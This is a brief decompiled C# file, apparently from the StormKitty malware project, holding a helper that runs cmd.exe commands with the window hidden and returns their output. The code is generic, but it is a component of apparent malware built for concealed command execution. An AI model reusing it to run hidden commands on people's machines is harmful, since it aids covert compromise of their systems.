using System;
using System.Diagnostics;

namespace StormKitty
{
	// Token: 0x0200004A RID: 74
	internal sealed class CommandHelper
	{
		// Token: 0x06000136 RID: 310 RVA: 0x00009DDC File Offset: 0x00007FDC
		public static string Run(string cmd, bool wait = true)
		{
			string result = "";
			using (Process process = new Process())
			{
				process.StartInfo = new ProcessStartInfo
				{
					UseShellExecute = false,
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = cmd,
					RedirectStandardError = true,
					RedirectStandardOutput = true
				};
				process.Start();
				result = process.StandardOutput.ReadToEnd();
				if (wait)
				{
					process.WaitForExit();
				}
			}
			return result;
		}
	}
}
